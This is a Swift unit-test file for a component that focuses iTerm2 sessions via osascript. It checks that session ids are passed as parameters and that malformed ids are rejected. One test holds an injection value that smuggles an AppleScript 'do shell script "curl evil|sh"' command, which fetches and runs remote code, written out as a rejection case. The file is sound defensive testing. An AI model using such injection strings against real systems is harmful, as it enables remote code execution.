import XCTest
@testable import AgentPetCore

final class ITerm2LocatorTests: XCTestCase {
    func test_valid_ref_builds_parameterized_osascript_invocation() throws {
        let loc = ITerm2Locator()
        let ref = TerminalRef(kind: .iterm2, itermSessionId: "w0t1p0:ABCD-1234")
        let inv = try loc.focusInvocation(for: ref)
        XCTAssertEqual(inv.executable, "/usr/bin/osascript")
        // 脚本本体 + "-" + 分隔 + id 作为独立 argv（参数化，未内插）
        XCTAssertTrue(inv.arguments.contains("w0t1p0:ABCD-1234"))
        // 脚本本体里不得出现被内插的 id
        let script = inv.arguments.first ?? ""
        XCTAssertFalse(script.contains("w0t1p0:ABCD-1234"))
        XCTAssertTrue(script.contains("on run argv"))
    }

    func test_injection_attempt_in_ref_is_rejected() {
        let loc = ITerm2Locator()
        let evil = TerminalRef(kind: .iterm2,
            itermSessionId: "x\" \n do shell script \"curl evil|sh\" \n \"")
        XCTAssertThrowsError(try loc.focusInvocation(for: evil)) { err in
            XCTAssertEqual(err as? LocatorError, .invalidRef)
        }
    }

    func test_missing_iterm_session_id_throws() {
        let loc = ITerm2Locator()
        XCTAssertThrowsError(try loc.focusInvocation(for: TerminalRef(kind: .iterm2))) { err in
            XCTAssertEqual(err as? LocatorError, .missingRef)
        }
    }

    func test_capability_is_precise() {
        XCTAssertEqual(ITerm2Locator().capability, .precise)
        XCTAssertEqual(ITerm2Locator().kind, .iterm2)
    }

    /// H3-4: 脚本遍历完无 return 时触发 error，使 osascript 以非零退出（面板 H3-4）
    func test_script_contains_session_not_found_error() throws {
        let loc = ITerm2Locator()
        let ref = TerminalRef(kind: .iterm2, itermSessionId: "w0t1p0:ABCD-1234")
        let inv = try loc.focusInvocation(for: ref)
        let script = inv.arguments[0]
        XCTAssertTrue(script.contains("error"), "script must contain 'error' keyword")
        XCTAssertTrue(script.contains("session not found"), "script must contain 'session not found' message")
    }

    func test_id_validator_rejects_quotes_spaces_newlines() {
        XCTAssertTrue(ITermSessionId.isValid("w0t1p0:ABCD-1234"))
        XCTAssertTrue(ITermSessionId.isValid("w0t1p0"))
        XCTAssertFalse(ITermSessionId.isValid("a b"))
        XCTAssertFalse(ITermSessionId.isValid("a\"b"))
        XCTAssertFalse(ITermSessionId.isValid("a\nb"))
        XCTAssertFalse(ITermSessionId.isValid(""))
        XCTAssertFalse(ITermSessionId.isValid("a$b"))
        XCTAssertFalse(ITermSessionId.isValid("a`b"))
        XCTAssertFalse(ITermSessionId.isValid("a;b"))
        XCTAssertFalse(ITermSessionId.isValid("a\\b"))
        XCTAssertFalse(ITermSessionId.isValid("a(b)"))
        XCTAssertFalse(ITermSessionId.isValid("a/b"))
        XCTAssertFalse(ITermSessionId.isValid("é"))   // 非 ASCII 字母现在也应被拒
    }
}
